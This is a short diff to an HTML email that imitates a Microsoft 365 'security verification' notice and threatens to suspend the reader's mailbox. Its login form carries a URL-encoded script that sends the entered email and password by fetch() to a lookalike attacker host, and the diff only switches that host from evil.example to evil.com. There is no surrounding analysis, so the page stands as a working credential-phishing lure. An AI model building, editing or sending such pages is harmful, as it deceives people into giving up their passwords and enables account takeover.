@@ -13,7 +13,7 @@ Content-Transfer-Encoding: 8bit
 <body>
   <h1>Microsoft 365 security verification</h1>
   <p>Your mailbox will be suspended unless you verify your password today.</p>
-  <form method="post" action="data:text/html,%3Cscript%3Efetch(%27https%3A%2F%2Fmicros0ft-login.evil.example%2Fcollect%27,%7Bmethod%3A%27POST%27,body%3Anew%20FormData(document.forms%5B0%5D)%7D)%3C%2Fscript%3E">
+  <form method="post" action="data:text/html,%3Cscript%3Efetch(%27https%3A%2F%2Fmicros0ft-login.evil.com%2Fcollect%27,%7Bmethod%3A%27POST%27,body%3Anew%20FormData(document.forms%5B0%5D)%7D)%3C%2Fscript%3E">
     <label>Email <input name="email" type="email"></label>
     <label>Password <input name="password" type="password"></label>
     <button type="submit">Verify account</button>
